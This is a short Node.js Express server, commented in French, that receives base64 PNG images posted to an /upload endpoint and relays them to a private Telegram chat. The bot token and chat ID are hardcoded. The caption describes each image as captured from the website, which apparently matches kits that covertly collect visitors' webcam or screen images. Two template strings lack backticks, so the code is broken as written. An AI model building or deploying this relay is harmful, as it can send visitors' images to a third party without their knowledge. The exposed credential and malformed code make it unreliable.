const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const port = 3000;

// Remplacez par votre token de bot Telegram et votre chat ID
const TELEGRAM_BOT_TOKEN = '7287090448:AAHTG1CF8r5silHH_5XaI0jsWCVd2Rt9oVs';
const CHAT_ID = '6994578596';

app.use(bodyParser.json({ limit: '10mb' }));

app.post('/upload', async (req, res) => {
    const { image } = req.body;

    // Convertir le Data URL en Buffer
    const base64Data = image.replace(/^data:image\/png;base64,/, "");
    
    try {
        // Envoyer l'image à Telegram
        await axios.post(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto, {
            chat_id: CHAT_ID,
            photo: base64Data,
            caption: 'Voici une image capturée depuis le site web.'
        });

        res.json({ message: 'Image envoyée à Telegram' });
    } catch (error) {
        console.error('Erreur lors de l\'envoi à Telegram:', error);
        res.status(500).json({ message: 'Erreur lors de l\'envoi à Telegram' });
    }
});

app.listen(port, () => {
    console.log(Serveur en écoute sur http://localhost:${port});
});